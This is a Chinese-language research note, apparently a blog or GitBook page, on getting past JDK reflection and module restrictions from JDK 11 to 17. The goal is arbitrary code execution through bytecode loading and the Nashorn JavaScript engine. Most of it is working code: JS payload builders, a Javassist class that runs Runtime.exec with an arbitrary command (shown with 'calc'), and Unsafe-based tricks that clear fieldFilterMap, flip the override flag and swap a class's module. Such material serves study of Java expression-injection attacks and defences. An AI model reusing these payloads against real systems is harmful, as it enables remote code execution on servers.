# 静态常量修改

修改`static final`属性值，关键在于通过反射将字段的`final`修饰符去掉

在JDK<=11，可以按照如下流程修改：

1. 通过反射获取`java.lang.reflect.Field`内部的`modifiers` Field
2. 将修改目标字段的 `modifiers` 修改为非 `final`
3. 设置目标字段为新的值

```java
public class FinalTest {
    private static final String secret = "Y0U_C4nNot_M0d1fy_M3";
}

Field modifierField = Class.forName("java.lang.reflect.Field").getDeclaredField("modifiers");
modifierField.setAccessible(true);
Field secret = FinalTest.class.getDeclaredField("secret");
secret.setAccessible(true);
modifierField.setInt(secret, secret.getModifiers() & ~Modifier.FINAL);
secret.set(null, "G0T_Y0U");
System.out.println(secret.get(null));  // G0T_Y0U
```

但自从 Java 12 开始，直接获取 Field 的 `modifiers` 字段会得到以下错误

> Exception java.lang.NoSuchFieldException: modifiers
>
> at java.base/java.lang.Class.getDeclaredField

👉 `https://bugs.openjdk.org/browse/JDK-8210522`

为防止安全敏感的字段被修改，JDK12开始反射过滤机制增强

对比 JDK11 和 JDK14 的`jdk.internal.reflect.Reflection`

![image-20230901124958388](./../.gitbook/assets/image-20230901124958388.png)

可以看到`fieldFilterMap`增加了`Field.class`的所有成员，即`Field`下的任何字段都不能直接通过公共反射方法获取。

跟一下反射调用的流程 `getDeclaredField`

![image-20230901125843607](./../.gitbook/assets/image-20230901125843607.png)

进入`privateGetDeclaredFields`，看到这里开始过滤反射字段

![image-20230901125937031](./../.gitbook/assets/image-20230901125937031.png)

![image-20230901130323163](./../.gitbook/assets/image-20230901130323163.png)

这里实际上已经通过`getDeclaredFields0`获取到了所有字段了

`getDeclaredFields0`是`java.lang.Class`下的方法，`Reflection`中的`methodFilterMap`并未过滤此方法，因此我们直接反射调用`getDeclaredFields0`就能获取到`Fields`的所有成员

```java
Method getDeclaredFields0 = Class.class.getDeclaredMethod("getDeclaredFields0", boolean.class);
getDeclaredFields0.setAccessible(true);
Field[] fields = (Field[]) getDeclaredFields0.invoke(Field.class, false);
Field modifierField = null;
for (Field f : fields) {
    if ("modifiers".equals(f.getName())) {
        modifierField = f;
        break;
    }
}
modifierField.setAccessible(true);
Field secret = FinalTest.class.getDeclaredField("secret");
secret.setAccessible(true);
modifierField.setInt(secret, secret.getModifiers() & ~Modifier.FINAL);
secret.set(null, "G0T_Y0U");
System.out.println(secret.get(null));
```

上面的绕过在JDK17以下可以成功，JDK17对`java*` 下的非公共字段进行反射调用获取的话就会直接报错，且看下文分析

# 反射加载字节码

Java不像其他脚本语言，如js、php、python等有eval函数，可以把字符串当作代码来执行。

因此在Java中最直接的任意代码执行的方式就是加载字节码了。其他代码执行的方式，如EL表达式、js引擎，限于语法的差异，并不能完美地兼容和契合Java自身的语法和类型。

加载字节码的几种方法：

* URLClassLoader#loadClass：需要出网或文件落地，不好使
* TransletClassLoader#defineClass：一般通过反序列化漏洞打进来
* ClassLoader#defineClass：需要通过反射调用

通过JS配合`ClassLoader#defineClass`来做到任意代码执行

JDK版本更迭史：

* JDK6、7
  * 引入JS引擎、采用Rhino实现，不支持`Java.type`等获取Java类型的操作
* JDK8
  * JS引擎采用Nashorn实现
* JDK9
  * 引入模块机制
  * 部分非标准库的类被移除
* JDK11
  * `Unsafe.defineClass`方法被移除
  * 默认禁止跨包之间反射调用非公共方法（非强制，只是警告）
* JDK12
  * `Reflection`类下的`fieldFilterMap`增加过滤。反射被大大限制
* JDK15
  * JS引擎被移除JDK
* JDK17
  * 强封装
  * 不得反射调用未开放模块的非公共方法（强制）


## JDK11

```java
public static String getJsPayload2(String code) throws Exception {
    return "var data = '" + code + "';" +
        "var bytes = java.util.Base64.getDecoder().decode(data);" +
        "var int = Java.type(\"int\");" +
        "var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(" +
        "\"defineClass\", bytes.class, int.class, int.class);" +
        "defineClassMethod.setAccessible(true);" +
        "var cc = defineClassMethod.invoke(" +
        "Thread.currentThread().getContextClassLoader(), bytes, 0, bytes.length);" +
        "cc.getConstructor(java.lang.String.class).newInstance(cmd);";
}

public static byte[] getEvilCode(String cmd) throws Exception {
    ClassPool pool = ClassPool.getDefault();
    CtClass clazz = pool.makeClass("a");
    CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
    constructor.setBody("Runtime.getRuntime().exec(\"" + cmd + "\");");
    clazz.addConstructor(constructor);
    clazz.getClassFile().setMajorVersion(49);
    return clazz.toBytecode();
}
@Test
public void jsTest() throws Exception {
    ScriptEngineManager manager = new ScriptEngineManager();
  manager.getEngineByName("js").eval(getJsPayload2(Base64.getEncoder().encodeToString(getEvilCode("calc"))));
}
```

上面通过js加载字节码会报错

> java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(byte[],int,int) throws java.lang.ClassFormatError accessible: module java.base does not "opens java.lang" to module jdk.scripting.nashorn.scripts
>
> at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible

但直接运行下面代码却可以

```java
public static void main(String[] args) throws Exception {
    Class<?> c = Class.forName("java.lang.ClassLoader");
    Method method = c.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
    method.setAccessible(true);
    byte[] bytes = getEvilCode("calc");
    Class<?> aClass = (Class<?>) method.invoke(Thread.currentThread().getContextClassLoader(), bytes, 0, bytes.length);
    aClass.newInstance();
}
```

`java.lang.reflect.Method`继承自`java.lang.reflect.Executable`，`Executable`和`java.lang.reflect.Field`均继承自`java.lang.reflect.AccessibleObject`

`AccessibleObject#checkCanSetAccessible`用于检测成员是否可以被设置为可访问

![image-20230901135104305](./../.gitbook/assets/image-20230901135104305.png)

![image-20230901135238665](./../.gitbook/assets/image-20230901135238665.png)

可以看到是否可访问取决于如下条件：

* 目标类为Public
  * 待访问的成员为Public
  * 待访问的成员为Protected、Static，且调用方是目标类的子类
* 目标类的模块对调用方的模块开放

### modifiers Bypass

根据上面的可访问条件，`ClassLoader`为PUBLIC，我们只需将`defineClass`方法的修饰符修改为`PUBLIC`即可

Java版本：

```java
public static void bypassModifier() throws Exception {
    Class<?> clazz = Class.forName("sun.misc.Unsafe");
    Field field = clazz.getDeclaredField("theUnsafe");
    field.setAccessible(true);
    Unsafe unsafe = (Unsafe) field.get(null);

    Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
    Field modifiers = defineClassMethod.getClass().getDeclaredField("modifiers");
    unsafe.putShort((Object) defineClassMethod, unsafe.objectFieldOffset(modifiers), (short) Modifier.PUBLIC);

    byte[] bytes = getEvilCode("calc");
    Class<?> aClass = (Class<?>) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), bytes, 0, bytes.length);
    aClass.newInstance();
}
```

Js版本：

```java
public static String getJsPayload3(String code) throws Exception {
    return "var data = '" + code + "';" +
        "var bytes = java.util.Base64.getDecoder().decode(data);" +
        "var Unsafe = Java.type(\"sun.misc.Unsafe\");" +
        "var field = Unsafe.class.getDeclaredField(\"theUnsafe\");" +
        "field.setAccessible(true);" +
        "var unsafe = field.get(null);" +
        "var Modifier = Java.type(\"java.lang.reflect.Modifier\");" +
        "var byteArray = Java.type(\"byte[]\");" +
        "var int = Java.type(\"int\");" +
        "var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(" +
        "\"defineClass\",byteArray.class,int.class,int.class);" +
        "var modifiers = defineClassMethod.getClass().getDeclaredField(\"modifiers\");" +
        "unsafe.putShort(defineClassMethod, unsafe.objectFieldOffset(modifiers), Modifier.PUBLIC);" +
        "var cc = defineClassMethod.invoke(" +
        "java.lang.Thread.currentThread().getContextClassLoader(),bytes,0,bytes.length);" +
        "cc.newInstance();";
}
```

### override field Bypass

回看`setAccessible`的调用逻辑

```java
@Override
@CallerSensitive
public void setAccessible(boolean flag) {
    AccessibleObject.checkPermission();
    if (flag) checkCanSetAccessible(Reflection.getCallerClass());
    setAccessible0(flag);
}
```

`checkCanSetAccessible`去判断目标的修饰符、目标类是否对调用类开放...最后返回flag再传给`setAccessible0`

```java
boolean setAccessible0(boolean flag) {
    this.override = flag;
    return flag;
}
```

`setAccessible0`直接将flag赋值给`this.override`，`override`是其父类`AccessibleObject`的属性

因此也可以直接修改`java.lang.reflect.AccessibleObject`的`override`属性

```java
public static void bypassOverride(Object accessibleObject) throws Exception {
    Field f = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
    f.setAccessible(true);
    Unsafe unsafe = (Unsafe) f.get(null);
    Field override = Class.forName("java.lang.reflect.AccessibleObject").getDeclaredField("override");
    unsafe.putBoolean(accessibleObject, unsafe.objectFieldOffset(override), true);
}
Class<?> c = Class.forName("java.lang.ClassLoader");
Method method = c.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
bypassOverride(method);
byte[] bytes = getEvilCode("calc");
Class<?> aClass = (Class<?>) method.invoke(Thread.currentThread().getContextClassLoader(), bytes, 0, bytes.length);
aClass.newInstance();
```

```java
String bypass = "var bypass = function(obj){" +
    "var Unsafe = Java.type('sun.misc.Unsafe');" +
    "var field = Unsafe.class.getDeclaredField(\"theUnsafe\");" +
    "field.setAccessible(true);" +
    "var unsafe = field.get(null);" +
    "var overrideField =" +
    "java.lang.Class.forName(\"java.lang.reflect.AccessibleObject\").getDeclaredField(\"override\");" +
    "var offset = unsafe.objectFieldOffset(overrideField);" +
    "unsafe.putBoolean(obj, offset, true);};";
```

JDK>=12之后，反射也过滤`java.lang.reflect.AccessibleObject`类的所有成员，得通过`getDeclaredFields0`去获取`override`属性

## JDK 12/13/14

JDK>=12报错提示：没有modifiers字段

> Caused by: java.lang.NoSuchFieldException: modifiers
> at java.base/java.lang.Class.getDeclaredField

### fieldFilterMap Bypass

看的BeiChen师傅写的 orz

https://github.com/BeichenDream/Kcon2021Code/blob/master/bypassJdk/JdkSecurityBypass.java

直接把`fieldFilterMap`置空了。

通过`unsafe.defineAnonymousClass`创建匿名内部类，由此匿名类来获取类成员偏移量（为什么要创建匿名类是因为`fieldFilterMap`过滤了`Reflection`的所有成员，无法直接使用`getDeclaredField`获取Field），最后再通过`unsafe.putObject`修改原来`Reflection`类的静态成员`fieldFilterMap`，此外还要删除`reflectionData`反射缓存。

Java版本：

```java
public static void bypassFieldFilterMap() throws Exception {
    Field f = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
    f.setAccessible(true);
    Unsafe unsafe = (Unsafe) f.get(null);

    Class<?> reflectionClass = Class.forName("jdk.internal.reflect.Reflection");
    byte[] classBuffer = reflectionClass.getResourceAsStream("Reflection.class").readAllBytes();
    Class<?> reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, null);
    Field fieldFilterMap = reflectionAnonymousClass.getDeclaredField("fieldFilterMap");

    if (fieldFilterMap.getType().isAssignableFrom(HashMap.class)) {
        unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMap), new HashMap<>());
    }

    byte[] clz = Class.class.getResourceAsStream("Class.class").readAllBytes();
    Class<?> classAnonymousClass = unsafe.defineAnonymousClass(Class.class, clz, null);
    Field reflectionData = classAnonymousClass.getDeclaredField("reflectionData");
    unsafe.putObject(Class.class, unsafe.objectFieldOffset(reflectionData), null);
}
```

Js版本：

```java
String bypass = "var bypass = function(){" +
    "var Unsafe = Java.type('sun.misc.Unsafe');" +
    "var HashMap = Java.type('java.util.HashMap');" +
    "var field = Unsafe.class.getDeclaredField(\"theUnsafe\");" +
    "field.setAccessible(true);" +
    "var unsafe = field.get(null);" +
    "var classClass = Java.type(\"java.lang.Class\");" +
    "var reflectionClass = java.lang.Class.forName(\"jdk.internal.reflect.Reflection\");" +
    "var classBuffer = reflectionClass.getResourceAsStream(\"Reflection.class\").readAllBytes();" +
    "var reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, null);" +
    "var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField(\"fieldFilterMap\");" +
    "if (fieldFilterMapField.getType().isAssignableFrom(HashMap.class)) {" +
    "unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMapField), new HashMap());" +
    "}" +
    "var clz = java.lang.Class.forName(\"java.lang.Class\").getResourceAsStream(\"Class.class\").readAllBytes();" +
    "var ClassAnonymousClass = unsafe.defineAnonymousClass(java.lang.Class.forName(\"java.lang.Class\"), clz, null);" +
    "var reflectionDataField = ClassAnonymousClass.getDeclaredField(\"reflectionData\");" +
    "unsafe.putObject(classClass, unsafe.objectFieldOffset(reflectionDataField), null);};";
```

### defineAnonymousClass Bypass

虽然JDK11把`Unsafe#defineClass`移除了，但`Unsafe#defineAnonymousClass`还在

```java
Field f = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
f.setAccessible(true);
Unsafe unsafe = (Unsafe) f.get(null);
unsafe.defineAnonymousClass(Class.class, getEvilCode("calc"), null).newInstance();
```

```java
public static String getJsPayload5(String code) throws Exception {
    return "var data = '" + code + "';" +
        "var bytes = java.util.Base64.getDecoder().decode(data);" +
        "var theUnsafe = java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");" +
        "theUnsafe.setAccessible(true);" +
        "unsafe = theUnsafe.get(null);" +
        "unsafe.defineAnonymousClass(java.lang.Class.forName(\"java.lang.Class\"), bytes, null).newInstance();";
}
```

## JDK17

JDK17中，在`checkCanSetAccessible`最后一关判断模块是否开放不能通过，导致抛出异常`Unable to make xxx accessible: module xxx does not opens xxx to xxx` 

```java
// package is open to caller
if (declaringModule.isOpen(pn, callerModule)) {
    return true;
}
```

`declaringModule`即目标`AccessibleObject`所在类`declaringClass`所在的模块

比如`java.lang.Class`所在`java.base`

`pn`是`declaringClass`的包名

跟进`Module#isOpen`

```java
/*
* Returns true if this module exports or opens the given package 
* to the given module. If the other module is EVERYONE_MODULE then
* this method tests if the package is exported or opened
* unconditionally.
*/
private boolean implIsExportedOrOpen(String pn, Module other, boolean open) {
    // all packages in unnamed modules are open
    if (!isNamed())
        return true;

    // all packages are exported/open to self
    if (other == this && descriptor.packages().contains(pn))
        return true;

    // all packages in open and automatic modules are open
    if (descriptor.isOpen() || descriptor.isAutomatic())
        return descriptor.packages().contains(pn);

    // exported/opened via module declaration/descriptor
    if (isStaticallyExportedOrOpen(pn, other, open))
        return true;

    // exported via addExports/addOpens
    if (isReflectivelyExportedOrOpen(pn, other, open))
        return true;

    // not exported or open to other
    return false;
}
```

如何判断目标模块是否开放或导出？

* `unnamed modules`对外开放
* 调用者所在模块就是目标模块，并且`pn`是目标模块下的包
* 目标模块设置设置对外开放或者它是`automatic`模块
* 目标模块是否导出`pn`包（`isStaticallyExportedOrOpen`）
* 目标模块是否反射可导出`pn`包（`isReflectivelyExportedOrOpen`）

（ JDK<17，这里`isStaticallyExportedOrOpen`返回true，模块默认开放所有包）

实际上这里有些条件在`checkCanSetAccessible`开始已经判定过了

```java
private boolean checkCanSetAccessible(Class<?> caller,
                                      Class<?> declaringClass,
                                      boolean throwExceptionIfDenied) {
    Module callerModule = caller.getModule();
    Module declaringModule = declaringClass.getModule();

    if (callerModule == declaringModule) return true;
    if (callerModule == Object.class.getModule()) return true;
    if (!declaringModule.isNamed()) return true;
}
```

* `callerModule`和`declaringModule`一致
* `callerModule`和`Object`所在模块一致
* `declaringModule`是`unnamed modules`

因此我们通过`Unsafe`修改当前调用者的模块为`Object`所在模块

（用`Unsafe`修改，刚好`fieldFilterMap`没有过滤`Class`的`module`成员）

还是以最开始的修改`final`字段为例

```java
// 设置当前调用者的模块为Object所在模块java.base
Class UnsafeClass = Class.forName("sun.misc.Unsafe");
Field unsafeField = UnsafeClass.getDeclaredField("theUnsafe");
unsafeField.setAccessible(true);
Unsafe unsafe = (Unsafe) unsafeField.get(null);
Module objModule = Object.class.getModule();
long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
unsafe.getAndSetObject(FinalBypass.class, addr, objModule);

Method getDeclaredFields0 = Class.forName("java.lang.Class").getDeclaredMethod("getDeclaredFields0", boolean.class);
getDeclaredFields0.setAccessible(true);
Field[] fields = (Field[]) getDeclaredFields0.invoke(Field.class, false);
Field modifierField = null;
for (Field field : fields) {
    if (field.getName().equals("modifiers")) {
        modifierField = field;
        break;
    }
}
if (modifierField == null)
    throw new NoSuchFieldException("modifiers");
modifierField.setAccessible(true);
Field secret = FinalTest.class.getDeclaredField("secret");
secret.setAccessible(true);
modifierField.setInt(secret, secret.getModifiers() & ~Modifier.FINAL);
secret.set(null, "G0T_Y0U");
System.out.println(secret.get(null));  // G0T_Y0U
```

# SumUp

总的来说，高版本JDK对于反射的限制有两点：

* JDK >= 12，`fieldFilterMap`新增黑名单类，反射获取字段受限
* JDK >= 9，反射调用方法/获取非公开字段，`checkCanSetAccessible`判断模块是否对外开放，非public类或非public方法/字段无法调用/获取

相应的绕过：

* JDK <= 11，对于公开类下的非公开成员的访问，修改其访问修饰符为public，或者修改`AccessibleObject`的`override`属性为true
* 12 <= JDK < 17，`Unsafe`实例化一个`Reflection`，获取`fieldFilterMap`偏移量，再置为空
* JDK = 17，修改当前调用类的module为`Object`的module

# Reference

* 2023KCon 《Java表达式攻防下的黑魔法》

* https://github.com/BeichenDream/Kcon2021Code/blob/master/bypassJdk/JdkSecurityBypass.java
